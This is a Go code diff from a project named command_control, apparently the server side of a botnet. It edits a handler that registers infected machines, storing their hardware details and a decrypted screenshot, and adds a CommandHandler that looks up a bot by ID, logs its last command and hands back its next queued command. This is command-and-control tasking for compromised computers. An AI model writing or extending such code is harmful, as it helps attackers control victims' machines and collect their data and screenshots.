@@ -8,6 +8,8 @@ import (
 	"strings"
 	"time"
 
+	"github.com/gobuffalo/pop/nulls"
+
 	"github.com/MShoaei/command_control/models"
 	"github.com/MShoaei/command_control/utils"
 
@@ -52,7 +54,8 @@ func (v BotsResource) List(c buffalo.Context) error {
 	if err := q.All(bots); err != nil {
 		return errors.WithStack(err)
 	}
-
+	q.Paginator.PerPage = 1
+	fmt.Println(q.Paginator.PerPage)
 	// Add the paginator to the context so it can be used in the template.
 	c.Set("pagination", q.Paginator)
 
@@ -259,8 +262,8 @@ func RegisterHandler(c buffalo.Context) error {
 	bot.CPU = c.Param("7")
 	bot.GPU = c.Param("8")
 	bot.Version = c.Param("9")
-	bot.LastCheckin = "not blank!"
-	bot.LastCommand = "not blank!"
+	// bot.LastCheckin = "not blank!"
+	// bot.LastCommand = "not blank!"
 
 	// Validate the data from the html form
 	verrs, err := tx.ValidateAndCreate(bot)
@@ -297,4 +300,39 @@ func RegisterHandler(c buffalo.Context) error {
 	ioutil.WriteFile(filepath.Join(botProfilePath, "Screenshots", "Default.png"), utils.Decrypt(c.Param("14")), os.ModeExclusive)
 
 	return c.Render(200, r.String(bot.ID.String()))
+}
+
+func CommandHandler(c buffalo.Context) error {
+	tx, ok := c.Value("tx").(*pop.Connection)
+	if !ok {
+		return errors.WithStack(errors.New("no transaction found"))
+	}
+
+	// Allocate an empty Bot
+	bot := &models.Bot{}
+
+	// To find the Bot the parameter bot_id is used.
+	// err should NOT be nil which means we didn't find this bot_id which is good!
+
+	if err := tx.Find(bot, c.Param("bot_id")); err != nil {
+		// return c.Error(404, err)
+		return c.Render(200, r.String("spin"))
+	}
+
+	if c.Param("1") == "" {
+		return c.Render(403, r.String("Fuck U!"))
+	}
+
+	bot.LastCommand = nulls.NewString(c.Param("1"))
+	tx.Update(bot)
+
+	return c.Render(200, r.String(bot.NewCommand.String))
+}
+
+func NewCommandHandler(c buffalo.Context) error {
+	// tx, ok := c.Value("tx").(*pop.Connection)
+	// if !ok {
+	// 	return errors.WithStack(errors.New("no transaction found"))
+	// }
+	return c.Render(200, r.String("Not Implemented"))
 }
